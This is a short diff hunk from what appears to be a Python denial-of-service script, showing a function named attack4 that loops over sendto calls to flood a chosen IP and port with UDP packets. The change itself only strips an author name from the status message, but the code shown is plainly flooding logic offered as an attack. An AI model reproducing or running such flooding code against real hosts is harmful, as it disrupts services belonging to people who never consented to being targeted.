@@ -66,7 +66,7 @@ def attack4():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
+			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port))
 		except:
 			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
 
